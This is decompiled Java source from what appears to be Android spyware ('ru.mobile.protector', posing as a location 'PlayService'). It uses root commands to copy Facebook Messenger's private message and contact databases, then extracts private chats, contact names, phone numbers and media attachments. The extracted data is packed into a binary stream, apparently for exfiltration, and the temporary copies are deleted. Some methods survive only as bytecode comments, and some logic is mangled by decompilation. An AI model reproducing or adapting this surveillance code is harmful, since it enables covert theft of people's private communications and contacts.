package ru.mobile.protector;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.util.Log;
import com.android.location.PlayService;
import java.io.File;
import java.io.OutputStream;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.json.JSONArray;
import org.json.JSONObject;

public class FacebookRT
{
  private static final byte ATTACH_PACKET = 99;
  public static final int D_FACEBOOK_ATTACH = 9;
  private static final byte END_OF_BLOCK = 2;
  private static final byte END_OF_FIELD = 1;
  private static final byte END_OF_LINE = 3;
  private static final byte FACEBOOK_ID = 11;
  private static final int M = 100;
  private static final byte START_OF_BLOCK = 97;
  private static String appContactsDBPath;
  private static String appDBPath;
  private static String appFilesPath;
  private static String appMessagesDBPath;
  private static final String fbDbContacts = "contacts_db2";
  private static final String fbDbMessages = "threads_db2";
  private static final String fbOcraPath = "/data/data/com.facebook.orca/databases/";
  
  public FacebookRT() {}
  
  private static void AddData(OutputStream paramOutputStream, String paramString)
  {
    if (paramOutputStream == null) {
      return;
    }
    String str = paramString;
    if (paramString == null) {
      str = "";
    }
    if (str != null) {}
    try
    {
      paramOutputStream.write(str.getBytes());
      try
      {
        paramOutputStream.write(1);
        return;
      }
      catch (Exception paramOutputStream)
      {
        EXCEPT(paramOutputStream, "AddData");
        return;
      }
      try
      {
        paramOutputStream.write(1);
        throw paramString;
      }
      catch (Exception paramOutputStream)
      {
        for (;;)
        {
          EXCEPT(paramOutputStream, "AddData");
        }
      }
    }
    catch (Exception paramString)
    {
      paramString = paramString;
      EXCEPT(paramString, "AddData");
      try
      {
        paramOutputStream.write(1);
        return;
      }
      catch (Exception paramOutputStream)
      {
        EXCEPT(paramOutputStream, "AddData");
        return;
      }
    }
    finally {}
  }
  
  private static void EXCEPT(Exception paramException, String paramString)
  {
    Log.v("gg", paramString);
    paramException.printStackTrace();
  }
  
  private static void FLOG(String paramString)
  {
    if (paramString != null)
    {
      PlayService.FLOG("FBA:" + paramString);
      return;
    }
    Log.v("gg", "null");
  }
  
  public static long Read(Context paramContext, OutputStream paramOutputStream, long paramLong)
  {
    if (paramLong == -1L)
    {
      l1 = -1L;
      return l1;
    }
    long l1 = -1L;
    appDBPath = "/data/data/" + paramContext.getPackageName() + "/databases/";
    appFilesPath = "/data/data/" + paramContext.getPackageName() + "/files/";
    if (copyDB())
    {
      Object localObject1 = null;
      paramContext = (Context)localObject1;
      for (;;)
      {
        Cursor localCursor;
        try
        {
          SQLiteDatabase localSQLiteDatabase1 = SQLiteDatabase.openDatabase(appMessagesDBPath, null, 0);
          paramContext = (Context)localObject1;
          SQLiteDatabase localSQLiteDatabase2 = SQLiteDatabase.openDatabase(appContactsDBPath, null, 0);
          i = 0;
          paramContext = (Context)localObject1;
          localCursor = localSQLiteDatabase1.rawQuery("SELECT msg_id, thread_key, text, sender, timestamp_ms FROM messages WHERE timestamp_ms > " + paramLong + " ORDER BY timestamp_ms", null);
          if (localCursor == null) {
            break label843;
          }
          paramContext = localCursor;
          if (!localCursor.moveToFirst()) {
            break label828;
          }
          paramContext = localCursor;
          paramOutputStream.write(97);
          String str3 = "";
          String str2 = "";
          paramContext = localCursor;
          String str4 = localCursor.getString(localCursor.getColumnIndex("text"));
          paramContext = localCursor;
          localObject1 = localCursor.getString(localCursor.getColumnIndex("thread_key"));
          j = i;
          paramLong = l1;
          if (str4 == null) {
            break label805;
          }
          paramContext = localCursor;
          j = i;
          paramLong = l1;
          if (!((String)localObject1).contains("ONE_TO_ONE")) {
            break label805;
          }
          paramContext = localCursor;
          String str5 = getMid(localCursor.getString(localCursor.getColumnIndex("msg_id")));
          paramContext = localCursor;
          l1 = localCursor.getLong(localCursor.getColumnIndex("timestamp_ms"));
          paramContext = localCursor;
          paramLong = l1 / 1000L;
          paramContext = localCursor;
          localObject1 = ((String)localObject1).replace("ONE_TO_ONE:", "");
          paramContext = localCursor;
          long l2 = Long.valueOf(getUserId((String)localObject1)).longValue();
          paramContext = localCursor;
          long l3 = Long.valueOf(getRecipientId((String)localObject1)).longValue();
          paramContext = localCursor;
          if (l2 == Long.valueOf(new JSONObject(localCursor.getString(localCursor.getColumnIndex("sender"))).getString("user_key").replace("FACEBOOK:", "")).longValue())
          {
            j = 1;
            paramContext = localCursor;
            Object localObject2 = localSQLiteDatabase2.rawQuery("SELECT data FROM contacts WHERE fbid = " + l3, null);
            localObject1 = str3;
            String str1 = str2;
            if (localObject2 != null)
            {
              localObject1 = str3;
              str1 = str2;
              paramContext = localCursor;
              if (((Cursor)localObject2).moveToFirst())
              {
                paramContext = localCursor;
                localObject1 = new JSONObject(((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("data")));
                paramContext = localCursor;
                str3 = ((JSONObject)localObject1).getJSONObject("name").getString("displayName");
                paramContext = localCursor;
                localObject2 = ((JSONObject)localObject1).getJSONArray("phones");
                localObject1 = str3;
                str1 = str2;
                paramContext = localCursor;
                if (((JSONArray)localObject2).length() < 0)
                {
                  paramContext = localCursor;
                  str1 = "" + ((JSONArray)localObject2).getJSONObject(0).getString("universalNumber");
                  localObject1 = str3;
                }
              }
            }
            paramContext = localCursor;
            AddData(paramOutputStream, str5);
            paramContext = localCursor;
            AddData(paramOutputStream, Integer.toString(11));
            paramContext = localCursor;
            AddData(paramOutputStream, str1);
            paramContext = localCursor;
            AddData(paramOutputStream, (String)localObject1);
            paramContext = localCursor;
            AddData(paramOutputStream, Long.toString(paramLong));
            paramContext = localCursor;
            AddData(paramOutputStream, Integer.toString(j));
            paramContext = localCursor;
            AddData(paramOutputStream, str4);
            paramContext = localCursor;
            AddData(paramOutputStream, "");
            paramContext = localCursor;
            AddData(paramOutputStream, "");
            paramContext = localCursor;
            AddData(paramOutputStream, "");
            paramContext = localCursor;
            paramOutputStream.write(3);
            i += 1;
            j = i;
            paramLong = l1;
            if (i < 100) {
              break label805;
            }
            paramLong = l1;
            paramContext = localCursor;
            paramOutputStream.write(2);
            paramContext = localCursor;
            if (!localCursor.isClosed())
            {
              paramContext = localCursor;
              localCursor.close();
            }
            l1 = paramLong;
            paramContext = localCursor;
            if (!localSQLiteDatabase1.isOpen()) {
              break;
            }
            paramContext = localCursor;
            localSQLiteDatabase1.close();
            return paramLong;
          }
        }
        catch (Exception paramOutputStream)
        {
          EXCEPT(paramOutputStream, "Read");
          if ((paramContext != null) && (!paramContext.isClosed())) {
            paramContext.close();
          }
          return -1L;
        }
        int j = 0;
        continue;
        label805:
        int i = j;
        l1 = paramLong;
        paramContext = localCursor;
        if (!localCursor.moveToNext())
        {
          continue;
          label828:
          paramContext = localCursor;
          FLOG("0 rows");
          paramLong = l1;
          continue;
          label843:
          paramContext = localCursor;
          FLOG("Failed to open");
          paramLong = l1;
        }
      }
    }
    FLOG("Failed to copy database");
    return -1L;
  }
  
  public static long ReadFile(Context paramContext, OutputStream paramOutputStream, long paramLong)
  {
    long l = 0L;
    appDBPath = "/data/data/" + paramContext.getPackageName() + "/databases/";
    appFilesPath = "/data/data/" + paramContext.getPackageName() + "/files/";
    Object localObject1 = null;
    paramContext = (Context)localObject1;
    for (;;)
    {
      Cursor localCursor;
      try
      {
        if (!copyDB()) {
          break;
        }
        paramContext = (Context)localObject1;
        SQLiteDatabase localSQLiteDatabase = SQLiteDatabase.openDatabase(appMessagesDBPath, null, 0);
        paramContext = (Context)localObject1;
        localCursor = localSQLiteDatabase.rawQuery("SELECT timestamp_ms, pending_send_media_attachment FROM messages WHERE timestamp_ms > " + paramLong + " ORDER BY timestamp_ms", null);
        if (localCursor == null) {
          break label738;
        }
        paramContext = localCursor;
        if (!localCursor.moveToFirst()) {
          break label723;
        }
        paramContext = localCursor;
        l = localCursor.getLong(localCursor.getColumnIndex("timestamp_ms"));
        paramContext = localCursor;
        paramLong = l / 1000L;
        paramContext = localCursor;
        if (localCursor.isNull(localCursor.getColumnIndex("pending_send_media_attachment"))) {
          break label704;
        }
        paramContext = localCursor;
        localObject1 = new JSONArray(localCursor.getString(localCursor.getColumnIndex("pending_send_media_attachment")));
        paramContext = localCursor;
        Object localObject2 = ((JSONArray)localObject1).getJSONObject(0).getString("uri").substring(7);
        paramContext = localCursor;
        String str = ((JSONArray)localObject1).getJSONObject(0).getString("mimeType");
        paramContext = localCursor;
        if (((String)localObject2).equals("")) {
          break label704;
        }
        paramContext = localCursor;
        FLOG("___________________________________________");
        paramContext = localCursor;
        FLOG("filePath: " + (String)localObject2);
        paramContext = localCursor;
        localObject1 = new File((String)localObject2);
        int i = 0;
        paramContext = localCursor;
        if (((File)localObject1).exists())
        {
          paramContext = localCursor;
          FLOG("can read file");
          i = 1;
          if (i == 0) {
            break label704;
          }
          paramContext = localCursor;
          FLOG("writing to fo");
          paramContext = localCursor;
          paramOutputStream.write(99);
          paramContext = localCursor;
          AddData(paramOutputStream, String.valueOf(paramLong));
          paramContext = localCursor;
          AddData(paramOutputStream, Integer.toString(9));
          paramContext = localCursor;
          AddData(paramOutputStream, str);
          paramContext = localCursor;
          AddData(paramOutputStream, ((File)localObject1).getName());
          paramContext = localCursor;
          AddData(paramOutputStream, String.valueOf(((File)localObject1).length()));
          paramContext = localCursor;
          writeFileToOutputStream(paramOutputStream, (File)localObject1);
          paramContext = localCursor;
          paramOutputStream.write(1);
          paramContext = localCursor;
          paramOutputStream.write(3);
          paramContext = localCursor;
          paramOutputStream.write(2);
          paramLong = l;
          paramContext = localCursor;
          if (((File)localObject1).getAbsolutePath().startsWith("/data/data/"))
          {
            paramContext = localCursor;
            ((File)localObject1).delete();
            paramLong = l;
          }
          paramContext = localCursor;
          if (!localCursor.isClosed())
          {
            paramContext = localCursor;
            localCursor.close();
          }
          paramContext = localCursor;
          l = paramLong;
          if (!localSQLiteDatabase.isOpen()) {
            break label762;
          }
          paramContext = localCursor;
          localSQLiteDatabase.close();
          l = paramLong;
          break label762;
        }
        paramContext = localCursor;
        localObject2 = copyFile((String)localObject2);
        paramContext = localCursor;
        FLOG("cp to: " + (String)localObject2);
        paramContext = localCursor;
        localObject2 = new File((String)localObject2);
        paramContext = localCursor;
        if (((File)localObject2).exists())
        {
          paramContext = localCursor;
          if (((File)localObject2).length() != 0L)
          {
            paramContext = localCursor;
            FLOG("cp OK");
            localObject1 = localObject2;
            i = 1;
            continue;
          }
          paramContext = localCursor;
          FLOG("zero length");
          paramContext = localCursor;
          ((File)localObject2).delete();
          continue;
        }
        paramContext = localCursor;
      }
      catch (Exception paramOutputStream)
      {
        EXCEPT(paramOutputStream, "Read");
        if ((paramContext != null) && (!paramContext.isClosed())) {
          paramContext.close();
        }
        return 0L;
      }
      FLOG("File not found");
      continue;
      label704:
      paramContext = localCursor;
      if (!localCursor.moveToNext())
      {
        paramLong = l;
        continue;
        label723:
        paramContext = localCursor;
        FLOG("0 rows");
        paramLong = l;
        continue;
        label738:
        paramContext = localCursor;
        FLOG("Failed to open");
        paramLong = l;
      }
    }
    paramContext = (Context)localObject1;
    FLOG("Failed to copy database");
    label762:
    return l;
  }
  
  /* Error */
  public static byte commandSU(String paramString)
  {
    // Byte code:
    //   0: invokestatic 358	java/lang/Runtime:getRuntime	()Ljava/lang/Runtime;
    //   3: astore 5
    //   5: aconst_null
    //   6: astore 6
    //   8: aconst_null
    //   9: astore 9
    //   11: aconst_null
    //   12: astore 8
    //   14: iconst_0
    //   15: istore_1
    //   16: aload 5
    //   18: ldc_w 360
    //   21: invokevirtual 364	java/lang/Runtime:exec	(Ljava/lang/String;)Ljava/lang/Process;
    //   24: astore 5
    //   26: aload 5
    //   28: astore 6
    //   30: new 366	java/io/OutputStreamWriter
    //   33: dup
    //   34: aload 5
    //   36: invokevirtual 372	java/lang/Process:getOutputStream	()Ljava/io/OutputStream;
    //   39: invokespecial 375	java/io/OutputStreamWriter:<init>	(Ljava/io/OutputStream;)V
    //   42: astore 7
    //   44: aload 7
    //   46: aload_0
    //   47: invokevirtual 377	java/io/OutputStreamWriter:write	(Ljava/lang/String;)V
    //   50: aload 7
    //   52: invokevirtual 380	java/io/OutputStreamWriter:flush	()V
    //   55: aload 7
    //   57: invokevirtual 381	java/io/OutputStreamWriter:close	()V
    //   60: aload 7
    //   62: ifnull +151 -> 213
    //   65: aload 7
    //   67: invokevirtual 381	java/io/OutputStreamWriter:close	()V
    //   70: aload 5
    //   72: astore_0
    //   73: aload_0
    //   74: ifnull +24 -> 98
    //   77: bipush 30
    //   79: istore_3
    //   80: iload_3
    //   81: iconst_1
    //   82: isub
    //   83: istore 4
    //   85: iload_3
    //   86: ifgt +81 -> 167
    //   89: iload 4
    //   91: ifgt +7 -> 98
    //   94: aload_0
    //   95: invokevirtual 384	java/lang/Process:destroy	()V
    //   98: iload_1
    //   99: ireturn
    //   100: astore_0
    //   101: aload 6
    //   103: astore 5
    //   105: aload 8
    //   107: astore 6
    //   109: iconst_1
    //   110: istore_2
    //   111: aload 5
    //   113: astore_0
    //   114: iload_2
    //   115: istore_1
    //   116: aload 6
    //   118: ifnull -45 -> 73
    //   121: aload 6
    //   123: invokevirtual 381	java/io/OutputStreamWriter:close	()V
    //   126: aload 5
    //   128: astore_0
    //   129: iload_2
    //   130: istore_1
    //   131: goto -58 -> 73
    //   134: astore_0
    //   135: aload 5
    //   137: astore_0
    //   138: iload_2
    //   139: istore_1
    //   140: goto -67 -> 73
    //   143: astore_0
    //   144: aload 9
    //   146: astore 5
    //   148: aload 5
    //   150: ifnull +8 -> 158
    //   153: aload 5
    //   155: invokevirtual 381	java/io/OutputStreamWriter:close	()V
    //   158: aload_0
    //   159: athrow
    //   160: astore_0
    //   161: aload 5
    //   163: astore_0
    //   164: goto -91 -> 73
    //   167: aload_0
    //   168: invokevirtual 387	java/lang/Process:exitValue	()I
    //   171: pop
    //   172: goto -83 -> 89
    //   175: astore 5
    //   177: ldc2_w 388
    //   180: invokestatic 395	java/lang/Thread:sleep	(J)V
    //   183: iload 4
    //   185: istore_3
    //   186: goto -106 -> 80
    //   189: astore_0
    //   190: iconst_3
    //   191: ireturn
    //   192: astore 5
    //   194: goto -36 -> 158
    //   197: astore_0
    //   198: aload 7
    //   200: astore 5
    //   202: goto -54 -> 148
    //   205: astore_0
    //   206: aload 7
    //   208: astore 6
    //   210: goto -101 -> 109
    //   213: aload 5
    //   215: astore_0
    //   216: goto -143 -> 73
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	219	0	paramString	String
    //   15	125	1	b1	byte
    //   110	29	2	b2	byte
    //   79	107	3	i	int
    //   83	101	4	j	int
    //   3	159	5	localObject1	Object
    //   175	1	5	localIllegalThreadStateException	IllegalThreadStateException
    //   192	1	5	localIOException	java.io.IOException
    //   200	14	5	localObject2	Object
    //   6	203	6	localObject3	Object
    //   42	165	7	localOutputStreamWriter	java.io.OutputStreamWriter
    //   12	94	8	localObject4	Object
    //   9	136	9	localObject5	Object
    // Exception table:
    //   from	to	target	type
    //   16	26	100	java/io/IOException
    //   30	44	100	java/io/IOException
    //   121	126	134	java/io/IOException
    //   16	26	143	finally
    //   30	44	143	finally
    //   65	70	160	java/io/IOException
    //   167	172	175	java/lang/IllegalThreadStateException
    //   94	98	189	java/lang/InterruptedException
    //   167	172	189	java/lang/InterruptedException
    //   177	183	189	java/lang/InterruptedException
    //   153	158	192	java/io/IOException
    //   44	60	197	finally
    //   44	60	205	java/io/IOException
  }
  
  private static boolean copyDB()
  {
    File localFile1 = new File(appDBPath);
    if (!localFile1.exists()) {
      localFile1.mkdirs();
    }
    localFile1 = new File(appFilesPath);
    if (!localFile1.exists()) {
      localFile1.mkdirs();
    }
    if (!new File("/data/data/com.facebook.orca/databases/").exists()) {
      FLOG("orca folder not found");
    }
    File localFile2;
    do
    {
      return false;
      commandSU("cat " + "/data/data/com.facebook.orca/databases/" + "threads_db2" + " > " + appDBPath + "fb_messages.db");
      commandSU("cat " + "/data/data/com.facebook.orca/databases/" + "contacts_db2" + " > " + appDBPath + "fb_contacts.db");
      appMessagesDBPath = appDBPath + "fb_messages.db";
      appContactsDBPath = appDBPath + "fb_contacts.db";
      commandSU("chmod 666 " + appMessagesDBPath);
      commandSU("chmod 666 " + appContactsDBPath);
      localFile1 = new File(appMessagesDBPath);
      localFile2 = new File(appContactsDBPath);
    } while ((!localFile1.exists()) || (!localFile2.exists()));
    return true;
  }
  
  public static String copyFile(String paramString)
  {
    File localFile = new File(paramString);
    FLOG("command: cat " + paramString + " > " + appFilesPath + localFile.getName());
    commandSU("cat " + paramString + " > " + appFilesPath + localFile.getName());
    commandSU("chmod 777 " + appFilesPath + localFile.getName());
    paramString = new File(appFilesPath + localFile.getName());
    if (paramString.exists()) {
      return paramString.getAbsolutePath();
    }
    return "";
  }
  
  private static String getMid(String paramString)
  {
    paramString = Pattern.compile("\\d{13}").matcher(paramString);
    if (paramString.find())
    {
      paramString = paramString.group(0);
      return paramString.substring(0, paramString.length() - 3);
    }
    return "";
  }
  
  private static String getRecipientId(String paramString)
  {
    paramString = Pattern.compile("[^:]*").matcher(paramString);
    if (paramString.find()) {
      return paramString.group(0);
    }
    return "";
  }
  
  private static String getUserId(String paramString)
  {
    paramString = Pattern.compile(":(.*)").matcher(paramString);
    if (paramString.find()) {
      return paramString.group(0).substring(1);
    }
    return "";
  }
  
  /* Error */
  private static void writeFileToOutputStream(OutputStream paramOutputStream, File paramFile)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_3
    //   2: aconst_null
    //   3: astore 4
    //   5: new 446	java/io/FileInputStream
    //   8: dup
    //   9: aload_1
    //   10: invokespecial 449	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   13: astore_1
    //   14: sipush 4096
    //   17: newarray byte
    //   19: astore_3
    //   20: aload_1
    //   21: aload_3
    //   22: invokevirtual 453	java/io/FileInputStream:read	([B)I
    //   25: istore_2
    //   26: iload_2
    //   27: ifgt +12 -> 39
    //   30: aload_1
    //   31: ifnull +60 -> 91
    //   34: aload_1
    //   35: invokevirtual 454	java/io/FileInputStream:close	()V
    //   38: return
    //   39: aload_0
    //   40: aload_3
    //   41: iconst_0
    //   42: iload_2
    //   43: invokevirtual 457	java/io/OutputStream:write	([BII)V
    //   46: goto -26 -> 20
    //   49: astore_0
    //   50: aload_1
    //   51: ifnull -13 -> 38
    //   54: aload_1
    //   55: invokevirtual 454	java/io/FileInputStream:close	()V
    //   58: return
    //   59: astore_0
    //   60: return
    //   61: astore_0
    //   62: aload_3
    //   63: astore_1
    //   64: aload_1
    //   65: ifnull +7 -> 72
    //   68: aload_1
    //   69: invokevirtual 454	java/io/FileInputStream:close	()V
    //   72: aload_0
    //   73: athrow
    //   74: astore_0
    //   75: return
    //   76: astore_1
    //   77: goto -5 -> 72
    //   80: astore_0
    //   81: goto -17 -> 64
    //   84: astore_0
    //   85: aload 4
    //   87: astore_1
    //   88: goto -38 -> 50
    //   91: return
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	92	0	paramOutputStream	OutputStream
    //   0	92	1	paramFile	File
    //   25	18	2	i	int
    //   1	62	3	arrayOfByte	byte[]
    //   3	83	4	localObject	Object
    // Exception table:
    //   from	to	target	type
    //   14	20	49	java/lang/Exception
    //   20	26	49	java/lang/Exception
    //   39	46	49	java/lang/Exception
    //   54	58	59	java/io/IOException
    //   5	14	61	finally
    //   34	38	74	java/io/IOException
    //   68	72	76	java/io/IOException
    //   14	20	80	finally
    //   20	26	80	finally
    //   39	46	80	finally
    //   5	14	84	java/lang/Exception
  }
}
